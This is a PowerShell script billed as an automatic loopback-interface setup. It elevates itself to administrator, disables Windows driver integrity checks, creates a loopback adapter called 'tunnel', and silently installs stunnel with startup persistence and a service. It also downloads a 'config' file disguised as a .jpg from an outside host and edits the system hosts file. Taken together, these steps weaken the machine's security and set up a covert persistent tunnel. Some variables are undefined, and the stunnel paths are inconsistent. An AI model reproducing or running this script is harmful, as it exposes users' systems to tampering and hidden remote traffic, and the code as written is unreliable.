param([switch]$Elevated)

function Test-Admin {
  $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
  $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) 
    {
        # tried to elevate, did not work, aborting
    } 
    else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
}

exit
}

'running with full privileges'


$scriptpath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptpath
Push-Location $dir
####

#### AUTO LOOPBACK INTERFACE CREATION SCRIPT ####


$output = cmd /c "bcdedit /set nointegritychecks ON"
$output = cmd /c "devcon -r install %windir%\inf\netloop.inf *msloop"


# rename the existing tunnel to "net"

#netsh int set int name = $id newname = "net"



# rename the loopback tunnel to "tunnel"
$id = (Get-WmiObject Win32_NetworkAdapter -Filter "Description='Microsoft Loopback Adapter'").NetConnectionID
netsh int set int name = $id newname = "tunnel"
netsh int ip set interface "tunnel" metric=254
function Set-IPAddress {
	param(	[string]$networkinterface = "tunnel",
			[string]$ip = "1.1.1.1",
			[string]$mask ="255.255.255.0",
			#$(read-host "Enter the subnet mask (ie 255.255.0.0)"),
			[string]$gateway ="17.24.16.254" ,
			#$(read-host "Enter the default gateway (ie 10.215.1.250"),
			[string]$registerDns = "FALSE"
    )      
	$NVSPBind = "nvspbind.exe"
    $index = (gwmi Win32_NetworkAdapter | where {$_.netconnectionid -eq $networkinterface}).InterfaceIndex
    $NetInterface = Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.InterfaceIndex -eq $index}
    $NetInterface.EnableStatic($ip, $mask)
    $NetInterface.SetGateways($gateway)
    $NetInterface.SetDynamicDNSRegistration($registerDns)
	$NetInterface.SetTcpipNetbios(2)
	#$NetInterface.DisableNetAdapterBinding($ComponentID)
	.\nvspbind.exe /d $networkinterface ms_server
	.\nvspbind.exe /d $networkinterface ms_msclient
}

Set-IPAddress -networkinterface "tunnel"

#install stunnel unattended
$install=".\stunnel.exe"
Start-Process -FilePath $install -ArgumentList '/S' -Wait -Verb RunAs
#Stunnel as start-up
Import-Module .\AddItemToStartup.psm1
Add-OSCStartup -ItemPath "C:\Program Files\stunnel\stunnel.exe"
#installing services
$install = "C:\Program Files (x86)\stunnel\stunnel.exe"
Start-Process -FilePath $install -ArgumentList '/install' -Wait -Verb RunAs


#Start stunnel service 
$srvName = "stunnel"
$servicePrior = Get-Service $srvName
"$srvName is now " + $servicePrior.status
Start-Service $srvName
$serviceAfter = Get-Service $srvName
"$srvName is now " + $serviceAfter.status

#Download config
$Url = "http://catqiz.com/17.jpg"
$Path = "C:\17.jpg"
$WebClient = New-Object System.Net.WebClient
$WebClient.Credentials = New-Object System.Net.Networkcredential($Username, $Password)
$WebClient.DownloadFile( $url, $path )

#Hosts
ac -Encoding UTF8  C:\Windows\system32\drivers\etc\hosts "127.0.1.1 samba.devstar.remote"